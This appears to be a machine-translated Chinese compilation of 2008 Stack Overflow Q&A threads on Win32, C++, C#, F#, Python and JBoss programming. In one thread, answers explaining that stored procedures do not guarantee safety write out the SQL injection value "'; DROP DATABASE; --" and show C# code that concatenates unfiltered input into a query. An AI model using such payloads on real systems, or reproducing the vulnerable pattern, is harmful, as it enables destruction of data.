*   `WM_VSCROLL`并`WM_LBUTTONUP`在 Richedit 的 wndproc 中
*   `EN_MSGFILTER`dlgproc 中的通知（是的，正在设置过滤器掩码）
*   `WM_VSCROLL``WM_LBUTTONUP`在 dlgproc 中。
*   `EN_VSCROLL`dlgproc 中的通知

我非常绝望，我尝试进行轮询，但这也不起作用，因为当鼠标按钮在滑块上按下时，定时器消息显然停止到达。我都试过了：

*   dlgproc 中的计时器回调（轮询）
*   Richedit 的 wndproc 中的计时器回调（轮询）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T13:47:49.310

您需要对编辑框进行子类化并将消息截获到编辑框本身。[这是 MSDN 上关于子类化控件的文章](http://msdn.microsoft.com/en-us/library/ms997565.aspx)。

编辑：一些代码来演示启用按钮的滚动条：

```
#include <windows.h>
#include <richedit.h>

LRESULT __stdcall RichEditSubclass
(
  HWND window,
  UINT message,
  WPARAM w_param,
  LPARAM l_param
)
{
  HWND
    parent = reinterpret_cast <HWND> (GetWindowLong (window, GWL_HWNDPARENT));

  WNDPROC
    proc = reinterpret_cast <WNDPROC> (GetWindowLong (parent, GWL_USERDATA));

  switch (message)
  {
  case WM_VSCROLL:
    {
      SCROLLINFO
        scroll_info = 
        {
          sizeof scroll_info,
          SIF_ALL
        };

      GetScrollInfo (window, SB_VERT, &scroll_info);

      if (scroll_info.nPos + static_cast <int> (scroll_info.nPage) >= scroll_info.nMax ||
          scroll_info.nTrackPos + static_cast <int> (scroll_info.nPage) >= scroll_info.nMax)
      {
        HWND
          button = reinterpret_cast <HWND> (GetWindowLong (parent, 0));

        EnableWindow (button, TRUE);
      }
    }
    break;
  }

  return CallWindowProc (proc, window, message, w_param, l_param);
}

LRESULT __stdcall ApplicationWindowProc
(
  HWND window,
  UINT message,
  WPARAM w_param,
  LPARAM l_param
)
{
  bool
    use_default_proc = false;

  LRESULT
    result = 0;

  switch (message)
  {
  case WM_CREATE:
    {
      CREATESTRUCT
        *creation_data = reinterpret_cast <CREATESTRUCT *> (l_param);

      RECT
        client;

      GetClientRect (window, &client);

      HWND
        child = CreateWindow (RICHEDIT_CLASS,
                              TEXT ("The\nQuick\nBrown\nFox\nJumped\nOver\nThe\nLazy\nDog\nThe\nQuick\nBrown\nFox\nJumped\nOver\nThe\nLazy\nDog"),
                              WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL | ES_DISABLENOSCROLL,
                              0, 0, client.right, client.bottom - 30,
                              window,
                              0,
                              creation_data->hInstance,
                              0);

      SetWindowLong (window, GWL_USERDATA, GetWindowLong (child, GWL_WNDPROC));
      SetWindowLong (child, GWL_WNDPROC, reinterpret_cast <LONG> (RichEditSubclass));
      SetWindowLong (child, GWL_ID, 0);

      child = CreateWindow (TEXT ("BUTTON"), TEXT ("Go Ahead!"), WS_CHILD | WS_VISIBLE | WS_DISABLED, 0, client.bottom - 30, client.right, 30, window, 0, creation_data->hInstance, 0);

      SetWindowLong (window, 0, reinterpret_cast <LONG> (child));
      SetWindowLong (child, GWL_ID, 1);
    }
    break;

  case WM_COMMAND:
    if (HIWORD (w_param) == BN_CLICKED && LOWORD (w_param) == 1)
    {
      DestroyWindow (window);
    }
    break;

  default:
    use_default_proc = true;
    break;
  }

  return use_default_proc ? DefWindowProc (window, message, w_param, l_param) : result;
}

int __stdcall WinMain
(
  HINSTANCE instance,
  HINSTANCE unused,
  LPSTR command_line,
  int show
)
{
  LoadLibrary (TEXT ("riched20.dll"));

  WNDCLASS
    window_class = 
    {
      0,
      ApplicationWindowProc,
      0,
      4,
      instance,
      0,
      LoadCursor (0, IDC_ARROW),
      reinterpret_cast <HBRUSH> (COLOR_BACKGROUND + 1),
      0,
      TEXT ("ApplicationWindowClass")
    };

  RegisterClass (&window_class);

  HWND
    window = CreateWindow (TEXT ("ApplicationWindowClass"),
                           TEXT ("Application"),
                           WS_VISIBLE | WS_OVERLAPPED | WS_SYSMENU,
                           CW_USEDEFAULT,
                           CW_USEDEFAULT,
                           400, 300, 0, 0,
                           instance,
                           0);

  MSG
    message;

  int
    success;

  while (success = GetMessage (&message, window, 0, 0))
  { 
    if (success == -1)
    {
      break;
    }
    else
    {
      TranslateMessage (&message);
      DispatchMessage (&message);
    }
  }

  return 0;
} 
```

以上不处理用户在编辑框中移动光标。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T23:04:43.447

我建议启动**Spy++**并查看哪些 Windows 消息被发送到何处。

[http://msdn.microsoft.com/en-us/library/aa264396(VS.60).aspx](http://msdn.microsoft.com/en-us/library/aa264396(VS.60).aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-28T02:32:09.097

Why not use the EM_GETTHUMB message. (Assuming Rich Edit 2.0 or later).

If you are lucky this bottom position will match EM_GETLINECOUNT.

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2008-10-27T13:49:05.143

即使有可能，我认为您不应该那样做 - 用户将不知道为什么按钮被禁用。这可能会非常令人困惑，应该不惜一切代价避免让用户感到困惑;-)

这就是为什么大多数许可证对话框都有接受/拒绝单选按钮，默认启用拒绝，因此您必须主动启用接受。

# visual-studio - 可以配置 VS2008 代码分析使用英式英语词典吗？

> ID：239872
> 
> 赞同：6
> 
> 时间：2008-10-27T13:30:10.890
> 
> 标签：visual-studio, visual-studio-2008, code-analysis

`IdentifiersShouldBeSpelledCorrectly`VS2008 代码分析将使用警告类型标记标识符中的拼写错误。

默认情况下，此过程使用美国词典，因为使用英国拼写正确拼写的单词被标记。例如，“组织”和“定制”等词......

我知道您可以创建自己的自定义 Xml 字典文件，其中包含您不想被标记的任何单词，但是，谁能告诉我您是否可以将代码分析配置为使用与那些不同的默认（或附加）字典在 Windows 中可用？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-27T16:08:12.367

太好了，谢谢。

解决方案的摘要是...

将该行添加 `CodeAnalysisCulture`到项目文件中。不幸的是，我认为必须对每个正在分析的项目都这样做......

```
<PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    ...
    <RunCodeAnalysis>true</RunCodeAnalysis>
    <CodeAnalysisCulture>en-GB</CodeAnalysisCulture>
    ... 
```

使用“en-GB”作为获取英式英语拼写检查的值。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T13:39:52.510

这应该为你做这件事[Visual Studio 2008 - 拼写规则](http://blogs.msdn.com/fxcop/archive/2007/08/12/new-for-visual-studio-2008-spelling-rules.aspx)

因此，只需在给出的示例中将 en-AU 替换为 en-GB 即可。

它引用了规则 IdentifiersShouldBeSpelledCorrectly。

# c++ - 将数据写入文件的“最佳”方法是什么，以便稍后再次读取。

> ID：239876
> 
> 赞同：4
> 
> 时间：2008-10-27T13:31:53.993
> 
> 标签：c++, file, file-io

将数据存储到网络上的文件的最佳方式是什么，稍后将以编程方式再次读取该文件。该程序的目标平台是 Linux (Fedora)，但需要将文件写入 Windows (XP) 机器

这需要在 C++ 中，会有大量的写入/读取事件，因此它需要高效，并且需要以可以轻松读回的方式写出数据。

整个文件可能没有被读回，我需要在文件中搜索特定的数据块并将其读回。

简单的二进制流编写器可以吗？我应该如何存储数据 - XML？

还有什么我需要担心的吗？

* * *

**更新：**为了澄清，这里有一些***彼得陈***观点的答案

> 请说清楚：
> 
> *** 你只附加块，还是你还需要删除/更新它们？**

我只需要追加到文件的末尾，但需要搜索并从其中的任何点检索

> ```
> *** are all blocks of the same size?** 
> ```

不，数据的大小会有所不同 - 有些是自由文本评论（如此处的帖子），有些是特定的对象状数据（参数集）

> ```
> *** is it necessary to be a single file?** 
> ```

不，但可取

> ```
> *** by which criteria do you need to locate blocks?** 
> ```

按数据类型和时间戳。例如，如果我定期写出一组特定的参数，在其他数据中，比如自由文本，我想在某个日期/时间找到这些参数的值 - 所以我需要搜索我的时间写出最接近该日期的那些参数并将它们读回。

> ```
> *** must the data be readable for other applications?** 
> ```

不。

> ```
> *** do you need concurrent access?** 
> ```

是的，我可能会在阅读时继续写作。但一次只能写一篇。

> ```
> *** Amount of data (per block / total) - kilo, mega, giga, tera?** 
> ```

每次写入的数据量会很低......从几个字节到几百个字节 - 总共应该看到不超过几百千字节，可能是 fwe 兆字节。（目前还不确定）

**> 如果你需要所有这些，自己动手将是一个挑战，我肯定会的

> 建议使用数据库。如果您需要的更少，请指定以便我们推荐。**

数据库会使系统过于复杂，因此不幸的是，这不是一种选择。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-27T13:39:42.247

你的问题太笼统了。我会首先定义我的需求，然后定义文件的记录结构，然后使用文本表示来保存它。看看[Eric Stone Raymond 的数据元格式](http://www.faqs.org/docs/artu/ch05s02.html)，在[JSON](http://www.json.org/)中，也许是[CSV](http://en.wikipedia.org/wiki/Comma-separated_values)或[XML](http://xml.silmaril.ie/)。peterchen 的所有观点似乎都是相关的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T14:28:58.947

> 会有大量的写入/读取事件，因此它需要高效，

那将没有效率。

在 Win2K 时代，我在这方面做了很多时间，当时我必须实现一个本质上包含文件副本的程序。我发现到目前为止，我的程序中最大的瓶颈似乎是每个 I/O 操作的开销。我发现在减少总运行时间方面最有效的一项是减少我请求的 I/O 操作的数量。

我开始做漂亮的流 I/O，但这并不好，因为愚蠢的编译器正在为每个字符发出一个 I/O。与 shell 的“复制”命令相比，它的性能实在是太差了。然后我试着一次写出一整行，但这只是稍微好一点。

最终，我编写了程序，试图将整个文件读入内存，这样在大多数情况下，只有 2 个 I/O：一个用于读入，另一个用于写出。这就是我看到巨大节省的地方。处理手动缓冲所涉及的额外代码在等待 I/O 完成的更短的时间内得到了弥补。

当然，这是大约 7 年前的事了，所以我想现在情况可能大不相同。如果您想确定，请自行计时。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-27T15:57:03.373

可能您应该有另一个文件，该文件将被读入具有固定大小数据的向量。

```
struct structBlockInfo
    {
        int iTimeStamp;    // TimeStamp 
        char cBlockType;   // Type of Data (PArameters or Simple Text)
        long vOffset;      // Position on the real File
    }; 
```

每次您添加一个新块时，您也会将其添加到该向量中对应的信息并保存。

现在，如果你想读取一个特定的块，你可以在这个向量上进行搜索，将自己定位在“真实文件”上，使用 fseek（或其他）到相应的偏移量，然后读取 X 个字节（这个偏移量到其他或文件末尾）并根据 cBlockType 对某些内容进行强制转换，例如：

```
 struct structBlockText
    {   
        char cComment[];
    };

    struct structBlockValuesExample1
    {   
        int iValue1;
        int iValue2;
    };

    struct structBlockValuesExample2
    {   
        int iValue1;
        int iValue2;
        long lValue1;
        char cLittleText[];
    }; 
```

读一些字节......

```
fread(cBuffer, 1, iTotalBytes, p_File); 
```

如果它是一个块文本...

```
structBlockText* p_stBlock = (structBlockText*) cBuffer; 
```

如果它是一个 structBlockValuesExample1...

```
structBlockValuesExample1* p_stBlock = (structBlockValuesExample1*) cBuffer; 
```

注意：cBuffer 可以容纳多个 Block。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T13:49:41.693

您的应用程序听起来需要一个数据库。如果您负担得起，请使用一个。但是不要使用像 sqlite 这样的嵌入式数据库引擎来通过网络存储文件，因为它可能对您的目的来说太不稳定了。如果你仍然想使用类似的东西，你必须通过你自己的读写器进程和你自己的访问协议来使用它，如果你使用像 XML 这样的基于文本的文件格式，稳定性问题仍然存在，所以你必须这样做他们也一样。

不过，如果不知道您的工作量，我无法确定。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-27T16:29:28.003

这就是我用于读取/写入数据的内容：

```
template<class T>
    int write_pod( std::ofstream& out, T& t )
{
    out.write( reinterpret_cast<const char*>( &t ), sizeof( T ) );
    return sizeof( T );
}

template<class T>
    void read_pod( std::ifstream& in, T& t )
{
    in.read( reinterpret_cast<char*>( &t ), sizeof( T ) );
} 
```

这不适用于向量、双端队列等，但只需写出后跟数据的项目数即可轻松完成：

```
struct object {
    std::vector<small_objects> values;

    template <class archive>
    void deserialize( archive& ar ) {
        size_t size;
        read_pod( ar, size );
        values.resize( size );
        for ( int i=0; i<size; ++i ) {
            values[i].deserialize( ar );
        }
    }
} 
```

当然，您需要实现序列化和反序列化功能，但它们很容易实现......

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-27T19:53:16.140

我会查看[Boost 序列化库](http://www.boost.org/doc/libs/1_36_0/libs/serialization/doc/index.html)

他们的例子之一是：

```
#include <fstream>

// include headers that implement a archive in simple text format
#include <boost/archive/text_oarchive.hpp>
#include <boost/archive/text_iarchive.hpp>

/////////////////////////////////////////////////////////////
// gps coordinate
//
// illustrates serialization for a simple type
//
class gps_position
{
private:
    friend class boost::serialization::access;
    // When the class Archive corresponds to an output archive, the
    // & operator is defined similar to <<.  Likewise, when the class Archive
    // is a type of input archive the & operator is defined similar to >>.
    template<class Archive>
    void serialize(Archive & ar, const unsigned int version)
    {
        ar & degrees;
        ar & minutes;
        ar & seconds;
    }
    int degrees;
    int minutes;
    float seconds;
public:
    gps_position(){};
    gps_position(int d, int m, float s) :
        degrees(d), minutes(m), seconds(s)
    {}
};

int main() {
    // create and open a character archive for output
    std::ofstream ofs("filename");

    // create class instance
    const gps_position g(35, 59, 24.567f);

    // save data to archive
    {
        boost::archive::text_oarchive oa(ofs);
        // write class instance to archive
        oa << g;
        // archive and stream closed when destructors are called
    }

    // ... some time later restore the class instance to its orginal state
    gps_position newg;
    {
        // create and open an archive for input
        std::ifstream ifs("filename");
        boost::archive::text_iarchive ia(ifs);
        // read class state from archive
        ia >> newg;
        // archive and stream closed when destructors are called
    }
    return 0;
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-27T15:42:20.203

如果您只谈论几兆字节，我根本不会存储在磁盘上。在网络上有一个进程接受数据并将其存储在内部，并且还接受对该数据的查询。如果需要记录数据，这个过程也可以将其写入磁盘。请注意，这听起来很像数据库，这确实可能是最好的方法。我不明白这如何使系统复杂化。事实上，它使事情变得容易得多。只需编写一个抽象数据库的类，并让其余代码使用它。

过去我自己也经历过同样的过程，包括将数据库视为过于复杂而忽略。它开始时相当简单，但几年后，我们编写了自己的、实现不佳、有缺陷、难以使用的数据库。那时，我们丢弃了我们的代码并转移到了 postgres。我们从不后悔改变。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-27T13:42:41.973

您需要查看您正在写出的数据类型。一旦你处理的是对象而不是 POD，简单地写出对象的二进制表示不一定会产生任何你可以成功反序列化的东西。

如果您“仅”写出文本，那么如果您以相同的文本表示形式写出数据，则读回数据应该相对容易。如果你试图写出更复杂的数据类型，你可能需要查看 boost::serialization 之类的东西。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-27T14:50:12.227

如果您不进行文本存储，请将其存储为二进制文件。文本效率低得可怕；XML 更糟糕。存储格式缺乏效率预示着更大的文件传输，这意味着更多的时间。如果您必须存储文本，请通过 zip 库对其进行过滤。

您的主要问题将是文件锁定和并发性。当您必须以并发方式进行写/读/写时，一切都开始变得轻松起来。在这一点上，安装某种数据库并将文件 BLOB 或其他东西，因为此时您将编写自己的数据库......并且*没有人*想重新发明那个轮子（你知道，如果他们不是'不做自己的数据库公司，或者是博士生，或者有一个奇怪的爱好......）

# c# - C#：如何包含依赖的 DLL？

> ID：239881
> 
> 赞同：12
> 
> 时间：2008-10-27T13:33:23.740
> 
> 标签：c#, visual-studio, deployment, dll

我正在使用在 2 个 DLL 中定义的第 3 方 API。我已经在我的项目中包含了这些 DLL 并设置了对它们的引用。到现在为止还挺好。

但是，这些 DLL 至少有一个在运行时无法找到的依赖 DLL。我将丢失的 DLL 复制到项目中并设置了“复制到输出”标志，但没有成功。

我应该在这里做什么来告诉项目它应该在哪里找到依赖的 DLL？

**澄清** 我尝试添加对丢失 DLL 的引用，但由于它未被识别为 .Net 组件。无奈之下，我直接将其添加到输出文件夹中，但没有成功。

最后，我在 PC 上安装了 API，一切正常。安装会设置 PATH 变量，并且 DLL 位于安装文件夹中。*但是如何告诉项目查看其内部文件夹之一呢？*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T13:53:52.887

听起来您需要更好地了解第三方库以及它如何使用自己的依赖项。如果 API 的安装解决了问题，但手动复制文件没有解决，那么你就错过了一些东西。缺少文件，或者需要一些环境变量或注册表项。在这方面真正有帮助的两件事是depends 工具（它是C++ 安装的一部分）和procmon，它将告诉您在运行时使用的所有注册表项和文件。

If you're lucky, it's just a file that you're missing. If that's all it is, you can use the "Build Events" section of the project to copy the needed files to the right location on a successful build. If not, you're going to have to solve this some other way - either by requiring the API be installed, or rolling your own installation project.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T13:36:15.777

你是如何部署的？只是平面文件？如果是这样，只要文件在项目输出目录中结束，它就应该可以工作。可以？

如果您正在使用另一个部署，则需要告诉该引擎将其包含在内。这对于每个 msi/ClickOnce/etc 都是不同的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T13:36:28.493

您可以慢慢添加下游依赖项作为对项目的引用。这很麻烦，而且有些脆弱

或者您可以使用微软的“Depends.exe”之类的工具来检查您的顶级程序集并获取依赖项的参考列表。

# f# - F#中的逻辑否定运算符？（！-相等的）

> ID：239888
> 
> 赞同：39
> 
> 时间：2008-10-27T13:35:09.617
> 
> 标签：f#, functional-programming

C#中的“！”等价于什么？F# 中的运算符？

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2008-10-27T13:37:34.137

根据[“F# 的基础”](https://rads.stackoverflow.com/amzn/click/com/1590597575)，第 61 页：

> F# 使用称为`not`布尔“非”操作的函数。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-27T14:36:04.673

有关更多信息，请参阅[Core.Operators 模块 (F#)](http://msdn.microsoft.com/en-us/library/ee353754%28v=VS.100%29.aspx)。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2008-10-30T04:36:11.887

你也可以使用“<>”

# database - 如果我使用存储过程，我对 SQL 注入免疫吗？

> ID：239905
> 
> 赞同：20
> 
> 时间：2008-10-27T13:39:08.160
> 
> 标签：database, security, stored-procedures, sql-injection

让我们说一下 MySQL 数据库（如果重要的话）。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-10-27T13:46:09.127

只有始终使用参数化查询，您才能免受 SQL 注入的影响。如果您在任何地方都使用适当的转义，您*几乎*不会受到 SQL 注入的影响（但是转义例程中可能存在并且已经存在错误，因此它不像参数那样万无一失）。

如果您调用存储过程，通过连接添加参数，我仍然可以在输入字段之一的末尾添加一个随机查询 - 例如，如果您有 CALL CheckLogin @username='$username', @password=' $password'，$-things 代表直接连接的变量，没有什么能阻止我将 $password 变量更改为“'; DROP DATABASE; --”。

显然，如果您事先清理输入，这也有助于防止 SQL 注入，但这可能会过滤掉不应该清理的数据。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2008-10-27T13:57:28.013

不，你不会完全安全。正如其他人所提到的，参数化查询总是要走的路——无论您如何访问数据库。

这有点像一个都市传说，使用 procs 你是安全的。我认为人们产生这种错觉的原因是因为大多数人认为您将使用代码中的参数化查询来调用 procs。但是，如果您不这样做，例如，如果您执行以下操作，那么您就会敞开心扉：

```
SqlCommand cmd = new SqlCommand("exec @myProc " + paramValue, con);
cmd.ExecuteNonQuery(); 
```

因为您使用的是来自最终用户的未过滤内容。再一次，他们所要做的就是终止线路（“;”），添加他们的危险命令，然后繁荣 - 你被冲洗了。

（顺便说一句，如果您在网络上，请不要从浏览器的查询字符串中获取未经过滤的垃圾信息——这使得对您的数据做极其糟糕的事情变得非常容易。）

如果您将查询参数化，您的状态会好得多。但是，正如这里的其他人所提到的，如果您的 proc 仍在生成动态 SQL 并执行它，则可能仍然存在问题。

我应该注意我不是反程序。Procs 对于解决数据访问的某些问题非常有帮助。但是 procs**并不是**SQL 注入的“灵丹妙药”。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-10-27T13:45:01.080

这取决于你的存储过程做什么。如果他们根据参数动态生成 SQL，然后执行该 SQL，那么您仍然容易受到攻击。否则，你很有可能会好起来——但我不愿听起来 100% 自信！

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-10-27T13:45:04.450

不。如果您正在构建调用存储过程的 SQL，那么您仍然是目标。

您应该在客户端创建参数化查询。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-10-27T13:43:55.717

不，因为您仍然可以在存储过程中使用 D-SQL ......并且在任何情况下验证和限制您的输入都是一个好主意。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-10-27T14:06:58.680

存储过程不是保证，因为实际上易受攻击的是任何动态代码，包括存储过程中的代码和动态生成的对存储过程的调用。

只要不使用任意输入来生成代码，参数化查询和使用参数调用的存储过程都不会受到注入的影响。请注意，有很多动态代码也不容易受到注入（例如动态代码中的整数参数）。

然而，在很大程度上（我不确定 100% 是否真的有可能）存储基于 procs 的架构的好处是，对于客户端的动态代码，注入甚至可以在一定程度上得到防御（但不是完美的），因为：

只有 EXEC 权限被授予应用程序正在连接的任何用户上下文，因此任何 SELECT、INSERT、UPDATE、DELETE 查询都将失败。当然，无论如何都不应该允许 DROP 等。因此，任何注入都必须采用 EXEC 的形式，因此最终，只有您在 SP 层中定义的操作才能被注入（而不是任意 SQL）。

将数据库服务定义为一组存储过程（如软件中的任何抽象层）的许多其他好处包括在不影响应用程序的情况下重构底层数据库的能力，更好地理解和监控数据库中使用模式的能力分析器，以及在数据库中选择性优化而无需部署新客户端的能力。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-10-27T19:46:42.973

此外，考虑使用细粒度的数据库访问（通常也称为基于角色的访问控制）您的数据库的主要用户应该具有完成其工作所需的权限，而不是其他权限。安装后不需要创建新表吗？撤销该权限。没有以 sysdba 身份运行的合法需要？那就不要！如果未授予用户该权限，则指示用户“删除数据库”的偷偷摸摸的注入将被阻止。那么您需要担心的只是数据泄漏的 SELECT 语句。

# vb.net - 这个属性应该是我的对象接口的一部分吗？

> ID：239909
> 
> 赞同：3
> 
> 时间：2008-10-27T13:40:08.470
> 
> 标签：vb.net, oop, interface, object

我有一个名为“IsSecureConnection”的属性，它是我的对象接口的一部分。这对于接口的大多数实现都是有意义的，但是，在某些实现中，我想将属性设为 ReadOnly。

即使所有实现都需要它（尽管有时略有不同），我是否应该从对象的接口中省略此属性？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-27T13:42:10.820

只需在界面中添加getter。

```
public interface Foo{
  bool MyMinimallyReadOnlyPropertyThatCanAlsoBeReadWrite {get;}
} 
```

接口指定对象必须实现的最小值；它没有说一个对象不能做什么。为此，您需要考虑创建基类。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-27T13:44:39.647

接口就像盐：到处撒盐：

```
public interface ICanBeSecure
{
    bool IsSecureConnection { get; }
}

public interface IIsSecureable : ICanBeSecure
{
    bool IsSecureConnection { get; set;}
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-27T13:45:55.680

你需要评估这个案例。如果让它始终可写没有意义，请将其分离到第二个接口中。

```
public interface IFoo {
   bool SecuredConnection{ get; }
}

public interface ISecurableOptionFoo: IFoo {
   bool SecuredConnection{ get; set; }
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-27T14:18:18.097

这实际上取决于您的客户最易读的内容。我可以想到几个选项：

1）继承的接口，虽然我不喜欢隐藏，但我认为它让任何 VB.NET 或显式客户端实现有点难看：

```
interface IObject {
    bool IsSecureConnection { get; }
   // ... other interface definitions //
}

interface ISecurableObject : IObject {
   new bool IsSecureConnection { get; set; }
} 
```

2）从属性中拆分集合，继承接口：

```
interface IObject {
    bool IsSecureConnection { get; }
   // ... other interface definitions //
}

interface ISecurableObject : IObject {
   void SetConnectionSecurity(bool isSecure);
} 
```

3) 更改语义以*尝试*获取安全连接，实现者可以自由地从以下位置返回 false：

```
interface ISecurable {
   bool IsSecureConnection { get; }
   bool TrySecureConnection();
} 
```

4）添加一个额外的检查属性：

```
interface ISecurable {
   bool IsSecureConnection { get; set; }
   bool SupportsSecureConnection { get; }
} 
```

所有这些都是，IMO，针对特定环境的有效设计。因为我没有关于用例的任何信息，除了几乎所有时间都可以建立安全连接 - 我可能会投票给 3。它很容易实现，客户端只有 1 个代码路径，并且有无异常机制（这是另一种形式的耦合）。您确实有客户不检查 TrySecureConnection 的返回的危险，但我认为它的问题比其他选择少。

如果客户端*更喜欢*安全连接，但不需要安全连接*-*那么 1 的缺点是需要重载或客户端检查其 IObject 是否真的是 ISecurableObject。两者都有点丑。2 有同样的问题，但没有麻烦的新/阴影诡计。但是，如果某些客户端需要安全连接，那么这（或 2）可能是要走的路 - 否则，您不能真正使用类型安全来强制执行安全连接。

4，虽然一个有效的设计 IMO（有些人不同意 - 请参阅对 IO.Stream 的反应）很容易让客户出错。如果 90% 的实施者都是安全的，那么很容易不检查 SupportsSecureConnection。如果 IsSecureConnection = true 调用不受支持，实现者也可以选择抛出异常或丢弃它，这要求客户端捕获并检查 IsSecureConnection 的新值。

# c# - SQL CE 3.5 部署问题，涉及 C# 和 C++ 之间的互操作

> ID：239910
> 
> 赞同：1
> 
> 时间：2008-10-27T13:41:02.617
> 
> 标签：c#, c++, sql, deployment, interop

我们有一个 C# 应用程序正在使用 SQL CE 3.5 的情况。为了允许遗留程序使用它的一些特性，我们制作了一个 C++ dll，它使用互操作从 C# 程序中提取它需要的信息。为此，C# 程序需要访问数据库。它不是一个非常复杂的场景。

但是，在尝试使用私有安装进行部署时，会出现一些问题。 **C#程序没有问题，它可以访问数据库并使用它没有任何问题。**

**但是，当尝试通过强制 C# 程序访问数据库的 C++ 互操作访问 C# 程序中的函数时，我们会遇到崩溃，异常说“......提供者：System.Data.SqlServerCe.3.5 是未安装”。**

这显然是因为我们无法将 App.config 文件添加到正在执行的程序中。

我们怎样才能解决这个问题？还有其他方法可以解决这个问题吗？任何其他形式的 SQL CE 3.5 安装方法都是不可能的。所以我们必须让它发挥作用。

问候，

磷

**编辑：**

我不是直接针对 SQL CE，而是通过 Linq2SQL。我试图将配置文件添加到我所有的 dll 中，它没有帮助。似乎只有可执行文件是否有 app.config 才重要。

抛出的异常说 - 未安装提供程序 System.Data.SqlServerCe.3.5。

根据堆栈跟踪要调用的最新函数是 System.Data.Linq.SqlClient.SqlProvider.System.Data.Linq.Provider.IProvider.Initialize(...)。

**编辑 2**

我已经添加了部署工作所需的所有文件。正如我在上面所写的，如果我通过一个带有 app.config 文件的 .net 可执行文件使用程序 dll（它使用 Linq 2 Sql），它指定在哪里查找 SQL CE 3.5 dll。部署*不能*只使用文件，需要一个 app.config 文件。

问题是我们必须通过 C++ 可执行文件来使用 dll 文件，它无法告诉 .net 在哪里寻找 Sql Ce 3.5 dll。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-28T09:33:05.923

将以下文件添加到您的应用程序文件夹：

*   sqlceca35.dll
*   sqlcecompact35.dll
*   sqlceer35E.dll
*   sqlceme35.dll
*   sqlceoledb35.dll
*   sqlceqp35.dll
*   sqlcese35.dll
*   System.Data.SqlServerCe.dll

那么它将起作用。

如果您没有在目标机器上明确安装 sql server ce 3.5（我认为大多数部署都是这种情况），那么这是必要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T22:38:54.963

您可以添加一个 foo.dll.config 文件并确保它与 DLL 一起存在。您只需要确保您的 DLL 中有代码以确定它在磁盘上的位置，并从同一位置读取配置。

祝你好运！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-11-20T14:58:13.500

我还看到一个实例，其中 GAC 中的 System.Data.SqlServerCe.dll 是错误的文件版本，我从 cmd 命令提示符替换了 GAC 中的 dll。

关于文件必须在文件夹中的观点是正确的 - 除非 GAC 因拥有多个版本而感到困惑

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-11-06T15:44:18.023

> 这显然是因为我们无法将 App.config 文件添加到正在执行的程序中。

为什么不？好的，所以 Visual Studio 不会自动构建配置文件并将其重命名并将其移动到输出目录，但是您是否尝试过`.exe.config`在 C++ 应用程序旁边添加一个文件？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-11-27T11:06:37.960

不要使用 LINQ，而是对从 C++ 程序调用的方法使用 SqlCeConnection、SqlCeCommand 等

# python - 字符串的 Python 文件接口

> ID：239912
> 
> 赞同：4
> 
> 时间：2008-10-27T13:42:15.873
> 
> 标签：python, string, file

是否有一个 Python 类将`file`接口（读、写等）包装在一个字符串周围？我的意思是类似于`stringstream`C++ 中的类。

我正在考虑使用它将输出重定向`print`到一个字符串中，就像这样

```
sys.stdout = string_wrapper()
print "foo", "bar", "baz"
s = sys.stdout.to_string() #now s == "foo bar baz" 
```

编辑：这是[如何在 Python 中将字符串包装到文件中的副本？](https://stackoverflow.com/questions/141449/how-do-i-wrap-a-string-in-a-file-in-python)

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-27T13:48:02.447

是的，有StringIO：

```
import StringIO
import sys

sys.stdout = StringIO.StringIO()
print "foo", "bar", "baz"
s = sys.stdout.getvalue() 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T13:51:41.690

为了获得更好的性能，请注意您也可以使用 cStringIO。但也要注意，这对于 python 3 来说不是很便携。

# java - JBoss 中的自定义错误页面

> ID：239921
> 
> 赞同：1
> 
> 时间：2008-10-27T13:45:08.957
> 
> 标签：java, web-services, jboss

大家好，这是我的第一个问题！

我正在尝试在我的 JBoss RESTful Web 服务中设置自定义错误页面。我从 400 错误开始，所以在我的 web.xml 中我添加了

```
<error-page>
    <error-code>400</error-code>
    <location>/400.html</location>
</error-page> 
```

